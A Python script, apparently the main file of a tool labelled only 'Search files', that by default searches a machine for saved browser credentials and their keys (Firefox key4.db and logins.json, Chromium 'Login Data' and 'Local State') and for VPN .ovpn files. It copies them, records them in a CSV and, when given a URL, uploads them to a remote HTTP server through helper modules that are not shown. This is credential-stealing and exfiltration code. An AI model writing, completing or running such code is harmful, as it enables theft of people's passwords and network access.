import argparse
import datetime
import os

from helpers import csv_manager, filemanager


def main(arguments):
    csv_manager.init()
    if arguments.search_files and arguments.search_files.strip():
        search_files = arguments.search_files
        if os.path.isfile(search_files):
            print('Is File')
        # TODO lire le fichier et ajouter chaque ligne dans un tableau
        elif ',' in search_files:
            search_files = search_files.split(',')
        else:
            search_files = [search_files]
    else:
        search_files = ['ovpn', 'key4.db', 'logins.json', 'Login Data', 'Local State']

    if arguments.contains_text and arguments.contains_text.strip():
        contains_text = arguments.contains_text
        if os.path.isfile(contains_text):
            print('Is File')
            # TODO lire le fichier et ajouter chaque ligne dans un tableau
        elif ',' in contains_text:
            contains_text = contains_text.split(',')
    else:
        contains_text = []

    if arguments.path and arguments.path.strip():
        path = arguments.path
    else:
        path = '' #D:\\Users\\Sorrow\\Desktop\\crawl

    files = filemanager.search_files(search_files, path=path, contains_txt=contains_text)
    filenames = filemanager.copy_files(files)
    csv_manager.add_rows(filenames)

    # url is not None AND url is not empty or blank
    if arguments.url and arguments.url.strip():
        dl_links = filemanager.send_files(arguments.url)
        csv_manager.update_dl_link(dl_links)


if __name__ == '__main__':
    # Calling main function
    start_time = datetime.datetime.now()

    parser = argparse.ArgumentParser(description='Search files')
    parser.add_argument('--url', dest='url', help='url parameter for http server')
    parser.add_argument('--search-files', dest='search_files',
                        help='file extension to find (\'txt\') or filename to find (\'secret.txt\')')
    parser.add_argument('--contains-text', dest='contains_text', help='text contains in filename')
    parser.add_argument('--path', dest='path', help='base directory to find files')

    args = parser.parse_args()
    main(args)

    end_time = datetime.datetime.now()
    print('Duration: {}'.format(end_time - start_time))
